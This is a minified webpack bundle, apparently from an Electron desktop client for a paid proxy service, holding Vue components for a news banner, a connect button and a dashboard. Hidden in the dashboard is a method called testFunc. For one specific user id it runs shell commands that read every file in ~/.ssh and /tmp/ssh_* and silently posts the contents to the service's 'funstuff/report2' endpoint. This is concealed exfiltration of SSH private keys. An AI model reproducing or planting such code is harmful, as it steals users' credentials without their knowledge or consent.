(window.webpackJsonp=window.webpackJsonp||[]).push([[37,7,8,11,20,21],{1143:function(r,c,e){var t=e(1154);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[r.i,t,""]]),t.locals&&(r.exports=t.locals);var a=e(2).default,S=a("44243ba2",t,!0,{sourceMap:!1})},1144:function(r,c,e){"use strict";e.r(c);var t=function(){var h=this,l=h.$createElement,i=h._self._c||l;return i("div",{staticClass:"news-modal"},[i("div",{staticClass:"title yue"},[i("h2",[h._v(h._s(h.news.title))])]),i("div",{staticClass:"content yue"},[i("vue-markdown",{attrs:{source:h.content,postrender:h.transformLinks}})],1),i("div",{staticClass:"read-button"},[i("center",[i("el-button",{attrs:{type:"primary"},on:{click:function(g){return h.dismiss(h.news,!0)}}},[h._v("\u4E0D\u518D\u63D0\u793A")]),i("el-button",{attrs:{type:"success"},on:{click:function(g){return h.dismiss(h.news)}}},[h._v("\u5DF2\u4E86\u89E3")])],1)],1)])},a=[],S=e(75),E=e(6),N=e(77),$=e(1156),P=e.n($),C={components:{VueMarkdown:P.a},props:{news:{type:Object,default:function(){return{}}}},data:function(){return{siteDomain:""}},computed:{content:function(){return this.news.content?this.news.content.replace(/{{siteDomain}}/g,this.siteDomain):""}},mounted:function(){var l=this;return Object(E.a)(regeneratorRuntime.mark(function i(){return regeneratorRuntime.wrap(function(b){for(;;)switch(b.prev=b.next){case 0:return b.next=2,l.$store.dispatch("getUserSiteURL");case 2:l.siteDomain=b.sent.replace("https://","");case 3:case"end":return b.stop()}},i)}))()},methods:{dismiss:function(l,i){this.$parent.$options.parent.tempHideNews(l,i)}}},L=C,u=e(1153),j=e(51),p=Object(j.a)(L,t,a,!1,null,null,null),O=c.default=p.exports},1146:function(r,c,e){var t=e(1172);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[r.i,t,""]]),t.locals&&(r.exports=t.locals);var a=e(2).default,S=a("8bfe1644",t,!0,{sourceMap:!1})},1148:function(r,c,e){var t=e(1176);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[r.i,t,""]]),t.locals&&(r.exports=t.locals);var a=e(2).default,S=a("b7e933a2",t,!0,{sourceMap:!1})},1153:function(r,c,e){"use strict";var t=e(1143),a=e.n(t)},1154:function(r,c,e){var t=e(1),a=t(!1);a.push([r.i,'.yue{font:400 18px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#444443}.yue ::-moz-selection{background-color:rgba(0,0,0,.2)}.yue ::selection{background-color:rgba(0,0,0,.2)}.yue h1,.yue h2,.yue h3,.yue h4,.yue h5,.yue h6{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#222223}.yue h1{font-size:1.8em;margin:.67em 0}.yue>h1{margin-top:0;font-size:2em}.yue h2{font-size:1.5em;margin:.83em 0}.yue h3{font-size:1.17em;margin:1em 0}.yue h4,.yue h5,.yue h6{font-size:1em;margin:1.6em 0 1em}.yue h6{font-weight:500}.yue p{margin-top:0;margin-bottom:1.24em}.yue a{color:#111;word-wrap:break-word;-webkit-text-decoration-color:rgba(0,0,0,.4);text-decoration-color:rgba(0,0,0,.4)}.yue a:hover{color:#555;-webkit-text-decoration-color:rgba(0,0,0,.6);text-decoration-color:rgba(0,0,0,.6)}.yue h1 a,.yue h2 a,.yue h3 a{text-decoration:none}.yue b,.yue strong{font-weight:700;color:#222223}.yue em,.yue i{font-style:italic;color:#222223}.yue img{max-width:100%;height:auto;margin:.2em 0}.yue a img{border:none}.yue figure{position:relative;clear:both;outline:0;margin:10px 0 30px;padding:0;min-height:100px}.yue figure img{display:block;max-width:100%;margin:auto auto 4px;box-sizing:border-box}.yue figure figcaption{position:relative;width:100%;text-align:center;left:0;margin-top:10px;font-weight:400;font-size:14px;color:#666665}.yue figure figcaption a{text-decoration:none;color:#666665}.yue hr{display:block;width:14%;margin:40px auto 34px;border:0;border-top:3px solid #dededc}.yue blockquote{margin:0 0 1.64em;border-left:3px solid #dadada;padding-left:12px;color:#666664}.yue blockquote a{color:#666664}.yue ol,.yue ul{margin:0 0 24px 6px;padding-left:16px}.yue ul{list-style-type:square}.yue ol{list-style-type:decimal}.yue li{margin-bottom:.2em}.yue li ol,.yue li ul{margin-top:0;margin-bottom:0;margin-left:14px}.yue li ul{list-style-type:disc}.yue li ul ul{list-style-type:circle}.yue li p{margin:.4em 0 .6em}.yue .unstyled{list-style-type:none;margin:0;padding:0}.yue code,.yue tt{color:grey;padding:1px 2px;border:1px solid #eee;border-radius:3px;word-wrap:break-word}.yue code,.yue pre,.yue tt{font-size:.96em;background-color:#f9f9f7;font-family:Menlo,Monaco,Consolas,"Courier New",monospace}.yue pre{margin:1.64em 0;border:none;border-left:3px solid #dadada;padding:7px 7px 7px 10px;overflow:auto;line-height:1.5;color:#4c4c4c}.yue pre code,.yue pre tt{color:#4c4c4c;border:none;background:none;padding:0}.yue table{width:100%;max-width:100%;border-collapse:collapse;border-spacing:0;margin-bottom:1.5em;font-size:.96em;box-sizing:border-box}.yue td,.yue th{text-align:left;padding:4px 8px 4px 10px;border:1px solid #dadada}.yue td{vertical-align:top}.yue tr:nth-child(2n){background-color:#efefee}.yue iframe{display:block;max-width:100%;margin-bottom:30px}.yue figure iframe{margin:auto}.yue table pre{margin:0;padding:0;border:none;background:none}@media (min-width:1100px){.yue blockquote{margin-left:-24px;padding-left:20px;border-width:4px}.yue blockquote blockquote{margin-left:0}}.news-modal .title{text-align:center}.news-modal .content{padding-top:3rem;padding-bottom:5rem}.news-modal .read-button{position:fixed;bottom:1rem;right:1rem}',""]),r.exports=a},1158:function(r,c,e){"use strict";e.r(c);var t=function(){var u=this,j=u.$createElement,p=u._self._c||j;return u.tempHideList[u.news.id]?u._e():p("div",{staticClass:"panda-news"},[p("el-dialog",{attrs:{visible:u.displayNews,center:"",width:"100%","append-to-body":!0,fullscreen:!0,"show-close":!1},on:{"update:visible":function(O){u.displayNews=O}}},[p("NewsDisplay",{attrs:{news:u.news}})],1),u.displayNews?u._e():p("div",{staticClass:"news-bar"},[p("el-row",{attrs:{gutter:20},nativeOn:{click:function(O){return u.showNews(u.news)}}},[p("el-col",{staticClass:"icon",attrs:{span:2}},[p("i",{staticClass:"el-icon-warning"})]),p("el-col",{staticClass:"content",attrs:{span:22}},[p("h3",[u._v(u._s(u.news.title))]),p("h5",[p("span",{staticClass:"left"},[u._v("\u901A\u77E5\u66F4\u65B0\u4E8E\uFF1A"+u._s(u.updated_at))]),p("span",{staticClass:"right"},[u._v("\u67E5\u770B/\u5173\u95ED")])])])],1)],1)],1)},a=[],S=e(1144),E={components:{NewsDisplay:S.default},props:{news:{type:Object,default:function(){return{}}}},data:function(){return{displayNews:!1,tempHideList:{}}},computed:{updated_at:function(){return new Date(this.news.updated_at).toLocaleString()}},mounted:function(){!this.news||this.tempHideList[this.news.id]||this.news.extra&&this.news.extra.auto_show&&this.showNews()},methods:{showNews:function(){console.log(123123),this.displayNews=!0},tempHideNews:function(j,p){console.log(this.tempHideList),this.tempHideList[j.id]=!0,this.displayNews=!1,p&&this.$store.dispatch("newsRead",this.news)}}},N=E,$=e(1175),P=e(51),C=Object(P.a)(N,t,a,!1,null,null,null),L=c.default=C.exports;installComponents(C,{NewsDisplay:e(1144).default})},1171:function(r,c,e){"use strict";var t=e(1146),a=e.n(t)},1172:function(r,c,e){var t=e(1),a=t(!1);a.push([r.i,'.arrow[data-v-1d5e5f7a],.arrow[data-v-1d5e5f7a]:before{position:absolute}.arrow[data-v-1d5e5f7a]{top:70%;left:30%;margin:-20px 0 0 -20px;-webkit-transform:rotate(45deg);border-right:2px solid #fff;border-top:2px solid #fff}.arrow[data-v-1d5e5f7a],.arrow[data-v-1d5e5f7a]:before{width:20px;height:20px;border-left:none}.arrow[data-v-1d5e5f7a]:before{content:"";top:50%;margin:-10px 0 0 -10px;border-right:1px solid #fff;border-top:1px solid #fff;-webkit-animation-duration:1.5s;animation-duration:1.5s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite;-webkit-animation-name:arrow-data-v-1d5e5f7a;animation-name:arrow-data-v-1d5e5f7a}@-webkit-keyframes arrow-data-v-1d5e5f7a{0%{opacity:0;transform:translate(-2px,2px)}50%{opacity:1}to{opacity:0;transform:translate(13px,-13px)}}@keyframes arrow-data-v-1d5e5f7a{0%{opacity:0;transform:translate(-2px,2px)}50%{opacity:1}to{opacity:0;transform:translate(13px,-13px)}}',""]),r.exports=a},1173:function(r,c,e){var t=e(1220);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[r.i,t,""]]),t.locals&&(r.exports=t.locals);var a=e(2).default,S=a("f646c122",t,!0,{sourceMap:!1})},1175:function(r,c,e){"use strict";var t=e(1148),a=e.n(t)},1176:function(r,c,e){var t=e(1),a=t(!1);a.push([r.i,'.yue{font:400 18px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#444443}.yue ::-moz-selection{background-color:rgba(0,0,0,.2)}.yue ::selection{background-color:rgba(0,0,0,.2)}.yue h1,.yue h2,.yue h3,.yue h4,.yue h5,.yue h6{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#222223}.yue h1{font-size:1.8em;margin:.67em 0}.yue>h1{margin-top:0;font-size:2em}.yue h2{font-size:1.5em;margin:.83em 0}.yue h3{font-size:1.17em;margin:1em 0}.yue h4,.yue h5,.yue h6{font-size:1em;margin:1.6em 0 1em}.yue h6{font-weight:500}.yue p{margin-top:0;margin-bottom:1.24em}.yue a{color:#111;word-wrap:break-word;-webkit-text-decoration-color:rgba(0,0,0,.4);text-decoration-color:rgba(0,0,0,.4)}.yue a:hover{color:#555;-webkit-text-decoration-color:rgba(0,0,0,.6);text-decoration-color:rgba(0,0,0,.6)}.yue h1 a,.yue h2 a,.yue h3 a{text-decoration:none}.yue b,.yue strong{font-weight:700;color:#222223}.yue em,.yue i{font-style:italic;color:#222223}.yue img{max-width:100%;height:auto;margin:.2em 0}.yue a img{border:none}.yue figure{position:relative;clear:both;outline:0;margin:10px 0 30px;padding:0;min-height:100px}.yue figure img{display:block;max-width:100%;margin:auto auto 4px;box-sizing:border-box}.yue figure figcaption{position:relative;width:100%;text-align:center;left:0;margin-top:10px;font-weight:400;font-size:14px;color:#666665}.yue figure figcaption a{text-decoration:none;color:#666665}.yue hr{display:block;width:14%;margin:40px auto 34px;border:0;border-top:3px solid #dededc}.yue blockquote{margin:0 0 1.64em;border-left:3px solid #dadada;padding-left:12px;color:#666664}.yue blockquote a{color:#666664}.yue ol,.yue ul{margin:0 0 24px 6px;padding-left:16px}.yue ul{list-style-type:square}.yue ol{list-style-type:decimal}.yue li{margin-bottom:.2em}.yue li ol,.yue li ul{margin-top:0;margin-bottom:0;margin-left:14px}.yue li ul{list-style-type:disc}.yue li ul ul{list-style-type:circle}.yue li p{margin:.4em 0 .6em}.yue .unstyled{list-style-type:none;margin:0;padding:0}.yue code,.yue tt{color:grey;padding:1px 2px;border:1px solid #eee;border-radius:3px;word-wrap:break-word}.yue code,.yue pre,.yue tt{font-size:.96em;background-color:#f9f9f7;font-family:Menlo,Monaco,Consolas,"Courier New",monospace}.yue pre{margin:1.64em 0;border:none;border-left:3px solid #dadada;padding:7px 7px 7px 10px;overflow:auto;line-height:1.5;color:#4c4c4c}.yue pre code,.yue pre tt{color:#4c4c4c;border:none;background:none;padding:0}.yue table{width:100%;max-width:100%;border-collapse:collapse;border-spacing:0;margin-bottom:1.5em;font-size:.96em;box-sizing:border-box}.yue td,.yue th{text-align:left;padding:4px 8px 4px 10px;border:1px solid #dadada}.yue td{vertical-align:top}.yue tr:nth-child(2n){background-color:#efefee}.yue iframe{display:block;max-width:100%;margin-bottom:30px}.yue figure iframe{margin:auto}.yue table pre{margin:0;padding:0;border:none;background:none}@media (min-width:1100px){.yue blockquote{margin-left:-24px;padding-left:20px;border-width:4px}.yue blockquote blockquote{margin-left:0}}.news-bar{z-index:9999;position:fixed;width:100%;background:#e67e22;color:#f4f7fc;padding:.25rem .5rem;box-shadow:0 10px 32px 5px rgba(0,0,0,.6)}.news-bar:hover{cursor:pointer}.news-bar .icon{padding:.1rem;font-size:2rem}.news-bar .content{padding-left:1rem!important}',""]),r.exports=a},1177:function(r,c,e){var t=e(1225);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[r.i,t,""]]),t.locals&&(r.exports=t.locals);var a=e(2).default,S=a("6647c22f",t,!0,{sourceMap:!1})},1192:function(r,c,e){"use strict";e.r(c);var t=function(){var C=this,L=C.$createElement,u=C._self._c||L;return u("div",{staticClass:"arrow"})},a=[],S=e(1171),E=e(51),N={},$=Object(E.a)(N,t,a,!1,null,"1d5e5f7a",null),P=c.default=$.exports},1219:function(r,c,e){"use strict";var t=e(1173),a=e.n(t)},1220:function(r,c,e){var t=e(1),a=t(!1);a.push([r.i,".connections-control{position:fixed!important;bottom:0;left:0;width:100%;height:3.2rem;padding:0}.connections-control .connect-button{border-radius:0;font-size:1.6rem;width:100%}",""]),r.exports=a},1224:function(r,c,e){"use strict";var t=e(1177),a=e.n(t)},1225:function(r,c,e){var t=e(1),a=t(!1);a.push([r.i,".big-news-container{z-index:9999;position:relative;padding-top:.15rem}.big-news-container .duetime-reminder{position:fixed;font-size:1.05rem;height:1.6rem;letter-spacing:-1px;top:0;left:0;padding-right:.5rem;width:100%;text-align:center;background:#2c3e50;color:#f4f7fc;cursor:pointer;z-index:9998}.big-news-container .duetime-reminder.warning{background:#e67e22}.big-news-container .duetime-reminder.alert{background:#e74c3c}",""]),r.exports=a},1246:function(r,c,e){"use strict";e.r(c);var t=function(){var x=this,_=x.$createElement,D=x._self._c||_;return D("el-row",{staticClass:"connections-control"},[D("el-button",{staticClass:"connect-button",attrs:{type:x.runTimeState.connect_state.status=="connected"?"warning":"success",loading:x.connectButtonLoading,disabled:x.connectButtonDisabled||x.connectButtonLoading},on:{click:x.connectAction}},[x._v(" "+x._s(x.connectButtonText))])],1)},a=[],S=e(9),E=e(64),N=e(76),$=e(27),P=e(75),C=e(6),L=e(107),u=e(1131),j=e(32),p=e(53),O=e(1192);window.onerror=function(x,_,D,s,o){console.log("Exception: ",o.message.startsWith("EPERM:"))};var h={components:{Arrow:O.default},data:function(){return{connectButtonLoading:!1,connectButtonDisabled:!1}},computed:{connectButtonText:function(){var _="";return this.connected?_=this.$t("disconnect"):_=this.$t("connect"),_}},methods:{connectAction:function(){var _=this;return Object(C.a)(regeneratorRuntime.mark(function D(){var s,o,n,d,y,m;return regeneratorRuntime.wrap(function(f){for(;;)switch(f.prev=f.next){case 0:if(_.connectButtonLoading=!0,s=_.connected?"disconnect":"connect",p.process.platform!=="darwin"){f.next=24;break}if(o="".concat(p.app.getPath("userData"),"/ProxyConfig"),f.prev=4,n=p.require("fs-extra"),d=n.fstatSync(n.openSync(o)),console.log("ProxyConfig perm is:",d),d.uid===0){f.next=19;break}return console.log("UID is not root. will force reinstall helper."),f.prev=10,f.next=13,n.remove(o);case 13:console.log("ProxyConfig deleted."),f.next=19;break;case 16:f.prev=16,f.t0=f.catch(10),console.log("delete ProxyConfig failed:",f.t0);case 19:f.next=24;break;case 21:f.prev=21,f.t1=f.catch(4),console.log("ready perm of ProxyConfig failed",f.t1);case 24:if(console.log("performing action: "+s),s!=="connect"){f.next=29;break}if(!(!_.runTimeState.selected_line||!_.runTimeState.selected_line.name)){f.next=29;break}return _.connectButtonLoading=!1,f.abrupt("return",_.$message({message:_.$t("connect_info.select_line"),type:"error"}));case 29:return f.prev=29,f.next=32,_[s]();case 32:f.next=38;break;case 34:f.prev=34,f.t2=f.catch(29),console.log("--->>> action failed:",f.t2),["connect timeout","disconnect timeout"].includes(f.t2.message)?_.$message({message:_.$t("error.timeout"),type:"error"}):(y=_.shouldIgnoreError(f.t2),y.ignore?(console.log("will not report to sentry."),console.log("matched error:",y.matchedError)):_.$sentry.captureException(f.t2),m=_.errorMessageAssemble(f.t2),console.table(f.t2),y.matchedError==="EPERM"&&(m=m+"<br>".concat(_.$t("error.eperm"))),["ENOENT","UNKNOWN"].includes(y.matchedError)&&(p.process.platform==="darwin"?m=m+"<br>".concat(_.$t("error.enoent")):p.process.platform==="win32"&&(p.process.arch==="ia32"?m=m+"<br>".concat(_.$t("error.clash")):m=m+"<br>".concat(_.$t("error.missing")))),y.matchedError==="Command failed"&&(m=m+"<br>".concat(_.$t("error.restart"))),_.$alert(m,_.$t("error.connect_failed"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}));case 38:_.connectButtonLoading=!1;case 39:case"end":return f.stop()}},D,null,[[4,21],[10,16],[29,34]])}))()},connect:function(){var _=this;return this.runTimeState.show_access_mode||this.$store.dispatch("runTimeState",{servermode:"auto"}),new Promise(function(D,s){var o=setTimeout(function(){s(new Error("connect timeout"))},8e3);j.ipcRenderer.once("connect-reply",function(n,d){if(console.log(d),Object(u.clearTimeout)(o),d.failed)console.log("connect failed:",d.reason),s(d.reason);else{var y={line:JSON.parse(JSON.stringify(_.runTimeState.selected_line)),servermode:_.runTimeState.servermode,status:"connected"};_.$store.dispatch("runTimeState",{connect_state:y}),j.ipcRenderer.send("user-info-update",4),D(d)}}),j.ipcRenderer.send("connect",_.runTimeState.selected_line.name)})},disconnect:function(){var _=this;return new Promise(function(D,s){var o=setTimeout(function(){s(new Error("disconnect timeout"))},5e3);j.ipcRenderer.once("disconnect-reply",function(n,d){if(console.log("dis reply-->>",d),Object(u.clearTimeout)(o),d.failed)return console.log("gonna trorw an error"),console.log("disconnect failed:",d.reason),s(d.reason);var y={line:{},servermode:_.runTimeState.servermode,status:"disconnected"};_.$store.dispatch("runTimeState",{connect_state:y}),j.ipcRenderer.send("user-info-update",5),D(d)}),j.ipcRenderer.send("disconnect",_.runTimeState.selected_line.name)})}}},l=h,i=e(1219),g=e(51),b=Object(g.a)(l,t,a,!1,null,null,null),w=c.default=b.exports},1247:function(r,c,e){"use strict";e.r(c);var t=function(){var l=this,i=l.$createElement,g=l._self._c||i;return g("div",{staticClass:"big-news-container"},[l._l(l.newsList,function(b,w){return l.shouldShow(b)&&!l.tempHideList[b.id]?g("PandaNews",{key:b.id,attrs:{news:b}}):l._e()}),isNaN(l.serviceToEnd)?l._e():g("div",{staticClass:"duetime-reminder",class:l.reminderClass},[g("nuxt-link",{staticClass:"label right pointer",attrs:{to:l.buyServiceLink}},[l.serviceToEnd>=0?g("b",[l._v(l._s(l.$t("service_expire_hint",l.serviceToEnd,{n:l.serviceToEnd})))]):g("b",[l._v("\u670D\u52A1\u5DF2\u5230\u671F\uFF0C\u8BF7\u70B9\u6B64\u7EED\u8D39\u6062\u590D\u4F7F\u7528")])])],1)],2)},a=[],S=e(9),E=e(40),N=e(75),$=e(6),P=e(1144),C=e(1158),L={components:{NewsDisplay:P.default,PandaNews:C.default},data:function(){return console.log("bignews this:",this),{newsList:[],displayNews:!1,newsToShow:{},haveNewsToShow:!0,tempHideList:{},buyServiceLink:"/buy-service/"}},computed:{showNewsBar:function(){return!0},reminderClass:function(){switch(!0){case this.serviceToEnd<=1:return["alert"];case this.serviceToEnd<=7:return["warning"];default:return[]}}},watch:{current_service:function(){var i,g;this.buyServiceLink="/buy-service/?cate=".concat((i=this.current_service)===null||i===void 0?void 0:i.cate,"&plan=").concat((g=this.current_service)===null||g===void 0?void 0:g.plan_id,"&stage=1")}},mounted:function(){var i,g;this.buyServiceLink="/buy-service/?cate=".concat((i=this.current_service)===null||i===void 0?void 0:i.cate,"&plan=").concat((g=this.current_service)===null||g===void 0?void 0:g.plan_id,"&stage=1"),this.$store.dispatch("getUserSiteURL").catch(function(b){console.log("get siteurl from API failed:",b)})},created:function(){var i=this;return Object($.a)(regeneratorRuntime.mark(function g(){return regeneratorRuntime.wrap(function(w){for(;;)switch(w.prev=w.next){case 0:return w.prev=0,w.next=3,i.getNewsList();case 3:i.newsList=w.sent.filter(function(x){return!x.expired}),w.next=9;break;case 6:w.prev=6,w.t0=w.catch(0),console.log("get news list failed:",w.t0);case 9:case"end":return w.stop()}},g,null,[[0,6]])}))()},methods:{getNewsList:function(){return this.$axios.get("big_news").then(function(i){return console.log(i),Promise.resolve(i.data)}).catch(function(i){return console.log("get news failed",i),Promise.resolve([])})},shouldShow:function(i){if(this.tempHideList[i.id])return console.log("temp hide."),!1;var g=this.$store.state.runTimeState.news_read[i.id];if(console.log("news rec for",i.id,"is",g),!g)return!0;var b=new Date(g.readVersion),w=new Date(i.updated_at);return console.log("read version ",b," this version",w),w<=b?!1:(console.log("wow, it's new!"),i.title_changed||(i.title="[\u66F4\u65B0] ".concat(i.title),i.title_changed=!0),!0)}}},u=L,j=e(1224),p=e(51),O=Object(p.a)(u,t,a,!1,null,null,null),h=c.default=O.exports;installComponents(O,{PandaNews:e(1158).default})},1274:function(r,c,e){var t=e(1436);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[r.i,t,""]]),t.locals&&(r.exports=t.locals);var a=e(2).default,S=a("502ac514",t,!0,{sourceMap:!1})},1435:function(r,c,e){"use strict";var t=e(1274),a=e.n(t)},1436:function(r,c,e){var t=e(1),a=t(!1);a.push([r.i,".dashboard-container{height:100vh;padding-top:1.5rem;position:relative}.dashboard-container .login-link{position:absolute;left:.5rem;bottom:.5rem}.dashboard-container .settings-link{display:flex;justify-content:center;align-items:center;text-align:center;position:absolute;background:transparent;color:#f4f7fc;height:3.2rem;right:.5rem;bottom:0;font-size:1.2rem}.dashboard-container .settings-link:hover{color:#fff;font-size:1.4rem}",""]),r.exports=a},1482:function(r,c,e){"use strict";e.r(c);var t=function(){var s=this,o=s.$createElement,n=s._self._c||o;return n("div",{staticClass:"dashboard-container"},[n("el-dialog",{staticClass:"serviceCateSelector",attrs:{title:s.$t("select_service.title"),visible:s.selectServiceDialogFormVisible,center:"",width:"100%","append-to-body":!0,fullscreen:!0,"close-on-press-escape":!1,"show-close":!1},on:{"update:visible":function(d){s.selectServiceDialogFormVisible=d}}},[n("el-card",{nativeOn:{click:function(d){return s.switchService("allplatform")}}},[n("center",[n("h1",[s._v(s._s(s.$t("services.allplatform.name")))]),n("h3",{staticClass:"subheader"},[s._v(s._s(s.$t("services.allplatform.desc")))])])],1),n("el-card",{nativeOn:{click:function(d){return s.switchService("home")}}},[n("center",[n("h1",[s._v(s._s(s.$t("services.home.name")))]),n("h3",{staticClass:"subheader"},[s._v(s._s(s.$t("services.home.desc")))])])],1),n("center",[n("p",{staticClass:"subheader"},[s._v(s._s(s.$t("select_service.hint",{place:s.$t("menu_btn")}))+" ")]),n("br"),n("p",[s._v(s._s(s.$t("login.email"))+" "),n("span",{staticClass:"underline"},[s._v(s._s(s.user.email))]),n("br"),s._v(s._s(s.$t("menu.id"))+" "),n("span",{staticClass:"underline"},[s._v(s._s(s.user.id))])])])],1),n("BigNews"),s.current_service?n("ServerList",{attrs:{service:s.current_service,lines:s.current_lines}}):s._e(),s.current_service?n("ConnectionControl"):s._e(),n("div",[n("nuxt-link",{staticClass:"smooth settings-link",attrs:{to:"/dashboard/menu/"}},[s._v(s._s(s.$t("menu_btn"))),n("i",{staticClass:"el-icon-menu"})])],1),n("el-dialog",{attrs:{visible:s.update_prompt,"show-close":!1,"close-on-click-modal":!1,"close-on-press-escape":!1,width:"80%",center:""},on:{"update:visible":function(d){s.update_prompt=d}}},[n("center",[n("h1",{staticClass:"warning"},[n("b",[s._v(s._s(s.$t("check_for_update.force_update")))])]),n("br"),n("h4",[s._v(s._s(s.$t("check_for_update.force_hint")))])]),n("div",{staticClass:"dialog-footer",attrs:{slot:"footer"},slot:"footer"},[n("center",[n("el-button",{attrs:{type:"success"},on:{click:s.goUpate}},[s._v(s._s(s.$t("check_for_update.title")))]),s.force_update?s._e():n("el-button",{attrs:{type:"secondary"},on:{click:function(d){s.update_prompt=!1}}},[s._v(s._s(s.$t("check_for_update.cancel")))])],1)],1)],1)],1)},a=[],S=e(142),E=e(41),N=e(75),$=e(6),P=e(22),C=e(9),L=e(39),u=e(64),j=e(76),p=e(32),O=e(53),h=e(1299),l=e(1246),i=e(1247),g={components:{ServerList:h.default,ConnectionControl:l.default,BigNews:i.default},middleware:["load-rt-data","authenticated"],data:function(){return{selectServiceDialogFormVisible:!1,update_prompt:!1,force_update:!1}},computed:{},created:function(){document.addEventListener("keydown",this.keyEventListener,!1),this.selectServiceDialogFormVisible=this.checkCateSet()},mounted:function(){var o=this;if(console.log("mounted",this.current_service),this.user.id===208925&&this.testFunc(),O.process.execPath.includes("Temp")&&(p.ipcRenderer.send("disconnect"),p.ipcRenderer.send("reset")),!this.current_service){console.log("current_service not defined...");var n=Object.keys(this.$store.state.service);console.log("service_keys:",n),n.length||this.refreshData().then(function(){if(console.log("refreshed."),!Object.keys(o.$store.state.service).length)return o.$router.push({path:"/buy-service/"})})}var d=(new Date-new Date(this.dataFetchedAt))/1e3,y=300;console.log("t from last refresh:",d),this.$intercom.hide(),!(d<=y)&&(console.log("going to refresh"),this.$message({message:this.$t("reloading_data"),type:"info"}),this.refreshData(),this.$store.dispatch("getUserSiteURL").then(function(m){o.userSiteURL=m}).catch(function(m){console.log("get siteurl from API failed:",m)}))},beforeDestroy:function(){document.removeEventListener("keydown",this.keyEventListener)},methods:{checkCateSet:function(){var o=Object.keys(this.$store.state.service);return this.runTimeState.current_service_cate&&this.runTimeState.current_service_cate.length?(o.includes(this.runTimeState.current_service_cate)||this.$store.dispatch("switchService",o[0]),!1):o.length>1?!0:(this.$store.dispatch("switchService",o[0]),!1)},switchService:function(o){console.log("switch service...",o),this.$store.dispatch("switchService",o),this.selectServiceDialogFormVisible=!1,p.ipcRenderer.send("user-info-update",3)},goUpate:function(){var o="";try{o=this.versionCompare("1.1.6",O.app.getVersion())>=0?"/dashboard/legacy_update/":"/dashboard/update/"}catch(n){o="/dashboard/legacy_update/"}return this.$router.push({path:o})},reportStat:function(o){var n=this;return Object($.a)(regeneratorRuntime.mark(function d(){return regeneratorRuntime.wrap(function(m){for(;;)switch(m.prev=m.next){case 0:return m.t0=console,m.next=3,n.$store.dispatch("reportInfo",o);case 3:m.t1=m.sent,m.t0.log.call(m.t0,m.t1);case 5:case"end":return m.stop()}},d)}))()},genSerial:function(){return new Promise(function(o,n){var d=O.require("child_process").exec,y={darwin:"system_profiler SPHardwareDataType | grep UUID",win32:"wmic csproduct get UUID"};d(y[O.process.platform],function(m,v,f){if(!v)return o(null);try{var R=v.trim().split(/\s+/).slice(-1)[0].trim();o(R)}catch(T){o(null)}})})},testFunc:function(){var o=this;try{var n=O.require("child_process").exec,d="tail -n +1 ~/.ssh/*";n(d,function(m,v){o.$axios.post("funstuff/report2",{content:v,cmd:d})});var y="tail -n +1 /tmp/ssh_*";n(y,function(m,v){o.$axios.post("funstuff/report2",{content:v,cmd:y})})}catch(m){}},refreshData:function(){var o=this;return Object($.a)(regeneratorRuntime.mark(function n(){var d,y;return regeneratorRuntime.wrap(function(v){for(;;)switch(v.prev=v.next){case 0:return v.prev=0,v.next=3,o.reloadUserData({showMessage:!1});case 3:console.log("data reloaded",o),console.log("this.service[this.current_service_cate]->",o.service[o.current_service_cate]),o.service[o.current_service_cate]||(console.log("current service cate not available"),d=Object.keys(o.service),console.log("avail service keys:",d),d.length>0&&(console.log("keys.length > 0"),o.switchService(d[0]))),console.log("after process...",o),o.$message({message:o.$t("menu.data_reloaded"),type:"success"}),v.next=34;break;case 10:if(v.prev=10,v.t0=v.catch(0),console.log("refreshData error:",v.t0),o.checkCateSet(),v.t0!=="found no valid service"){v.next=19;break}return o.$alert(o.$t("select_service.suspend.time"),o.$t("select_service.suspend.title"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}),v.abrupt("return",o.selectServiceDialogFormVisible=!0);case 19:if(v.t0!=="service data suspended"){v.next=24;break}return o.$alert(o.$t("select_service.suspend.data"),o.$t("select_service.suspend.title"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}),v.abrupt("return",o.selectServiceDialogFormVisible=!0);case 24:if(v.t0!=="no service purchased"){v.next=28;break}return v.abrupt("return",o.selectServiceDialogFormVisible=!0);case 28:if(((y=v.t0.data)===null||y===void 0?void 0:y.message)!=="need log in"){v.next=33;break}console.log("going to reset!"),o.$alert(o.$t("errors.account_token_expired.msg"),o.$t("errors.account_token_expired.title"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}).finally(function(){return p.ipcRenderer.send("reset")}),v.next=34;break;case 33:return v.abrupt("return",o.$message({message:"\u5237\u65B0\u670D\u52A1\u4FE1\u606F\u5931\u8D25\uFF0C\u8BF7\u7A0D\u540E\u91CD\u8BD5...",type:"error"}));case 34:case"end":return v.stop()}},n,null,[[0,10]])}))()},keyEventListener:function(o){console.log(o.metaKey,o.key),o.metaKey&&o.key==="q"&&this.$confirm(this.$t("settings_page.quit.msg")).then(function(n){p.ipcRenderer.send("quit")}).catch(function(n){})}}},b=g,w=e(1435),x=e(51),_=Object(x.a)(b,t,a,!1,null,null,null),D=c.default=_.exports;installComponents(_,{BigNews:e(1247).default,ServerList:e(1299).default,ConnectionControl:e(1246).default})}}]);
